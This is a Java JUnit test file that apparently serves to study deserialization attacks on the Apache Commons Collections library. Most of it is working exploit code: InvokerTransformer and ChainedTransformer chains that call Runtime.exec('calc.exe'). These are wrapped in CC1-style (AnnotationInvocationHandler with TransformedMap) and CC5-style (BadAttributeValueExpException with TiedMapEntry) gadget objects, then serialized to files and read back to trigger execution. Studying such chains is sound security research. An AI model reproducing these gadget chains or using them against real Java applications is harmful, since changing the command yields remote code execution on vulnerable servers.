package com.example.ApacheCommonCollection;

import com.example.ApacheCommonCollection.A;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.InterfaceAddress;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.MapUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;

public class TransformedMapTest {

  @Test
  public void TransformedMapTest_()
    throws NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
    Transformer factory = new Transformer() {

      public Object transform(Object key) {
        return (Integer) key;
      }
    };
    Map lazymap = MapUtils.lazyMap(new HashMap(), factory);
    System.out.println(lazymap.get(1));

    A a = new A();
    ConstantTransformer constantTransformer = new ConstantTransformer(A.class);
    Class aaclass = (Class) constantTransformer.transform(new Object());
    Method test = aaclass.getMethod("test", null);
    test.invoke(a, null);

    Method add = a
      .getClass()
      .getMethod("add", new Class[] { int.class, int.class });
    System.out.println(add.invoke(a, new Object[] { 1, 2 }));

    InvokerTransformer invokerTransformer = new InvokerTransformer(
      "add",
      new Class[] { int.class, int.class },
      new Object[] { 1, 2 }
    );
    System.out.println(invokerTransformer.transform(a));
  }

  @Test
  public void payloadTest1()
    throws IllegalAccessException, IllegalArgumentException, InvocationTargetException {
    ConstantTransformer constantTransformer = new ConstantTransformer(
      Runtime.class
    );
    Class runtimeClass = (Class) constantTransformer.transform(new Object());
    InvokerTransformer invokerTransformer = new InvokerTransformer(
      "getMethod",
      new Class[] { String.class, Class[].class },
      new Object[] { "getRuntime", null }
    );
    Method getRuntimeMethod = (Method) invokerTransformer.transform(
      runtimeClass
    );
    InvokerTransformer invokerTransformer2 = new InvokerTransformer(
      "invoke",
      new Class[] { Object.class, Object[].class },
      new Object[] { null, new Object[0] }
    );
    Runtime runtime = (Runtime) invokerTransformer2.transform(getRuntimeMethod);
    InvokerTransformer invokerTransformer3 = new InvokerTransformer(
      "exec",
      new Class[] { String.class },
      new Object[] { "calc.exe" }
    );
    invokerTransformer3.transform(runtime);
  }

  @Test
  public void payloadTest2()
    throws ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException {
    Transformer[] transformers = new Transformer[] {
      new ConstantTransformer(Runtime.class),
      new InvokerTransformer(
        "getMethod",
        new Class[] { String.class, Class[].class },
        new Object[] { "getRuntime", null }
      ),
      new InvokerTransformer(
        "invoke",
        new Class[] { Object.class, Object[].class },
        new Object[] { null, new Object[0] }
      ),
      new InvokerTransformer(
        "exec",
        new Class[] { String.class },
        new Object[] { "calc.exe" }
      ),
    };

    ChainedTransformer chainedTransformer = new ChainedTransformer(
      transformers
    );
    Map map = new HashMap<>();
    map.put("value", "value"); //TODO:
    TransformedMap transformedMap = (TransformedMap) TransformedMap.decorate(
      map,
      null,
      chainedTransformer
    );
    //transformedMap.put(1, 1);
    Map lazyMap = LazyMap.decorate(map, chainedTransformer);
    lazyMap.get("aa");

    //Map.Entry<String,Object> entry = (Entry<String, Object>) transformedMap.entrySet().iterator().next();
    ////entry.setValue("aa");
    //entry = new Entry<String,Object>() {
    //  @Override
    //  public String getKey(){return new String();}
    //  @Override
    //  public Object setValue(Object o){return null;}
    //  @Override
    //  public Object getValue(){return null;}
    //};

    Class cl = Class.forName(
      "sun.reflect.annotation.AnnotationInvocationHandler"
    );
    Constructor constructor = cl.getDeclaredConstructor(Class.class, Map.class); //TODO:
    constructor.setAccessible(true); //TODO:
    Object object = constructor.newInstance(Target.class, transformedMap); //TODO:

    FileOutputStream fileOutputStream = new FileOutputStream(
      "AnnotationPayload"
    );
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(
      fileOutputStream
    );
    objectOutputStream.writeObject(object);

    FileInputStream fileInputStream = new FileInputStream("AnnotationPayload");
    ObjectInputStream objectInputStream = new ObjectInputStream(
      fileInputStream
    );
    objectInputStream.readObject();
  }

  @Test
  public void payloadTest3() throws ClassNotFoundException, IOException {
    Transformer[] transformers = new Transformer[] {
      new ConstantTransformer(Runtime.class),
      new InvokerTransformer(
        "getMethod",
        new Class[] { String.class, Class[].class },
        new Object[] { "getRuntime", null }
      ),
      new InvokerTransformer(
        "invoke",
        new Class[] { Object.class, Object[].class },
        new Object[] { null, new Object[0] }
      ),
      new InvokerTransformer(
        "exec",
        new Class[] { String.class },
        new Object[] { "calc.exe" }
      ),
    };

    ChainedTransformer chainedTransformer = new ChainedTransformer(
      transformers
    );
    Map map = new HashMap<>();
    Map lazymap = LazyMap.decorate(map, chainedTransformer);
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");
    tiedMapEntry.toString();
    BadAttributeValueExpException e = new BadAttributeValueExpException(
      tiedMapEntry
    );

    Map<TiedMapEntry,Object> hashMap = new HashMap<>();
    

    
    FileOutputStream fileOutputStream = new FileOutputStream("e");
    ObjectOutputStream oStream = new ObjectOutputStream(fileOutputStream);
    oStream.writeObject(e);

    FileInputStream fileInputStream = new FileInputStream("e");
    ObjectInputStream objectInputStream = new ObjectInputStream(
      fileInputStream
    );
    objectInputStream.readObject();
  }
}
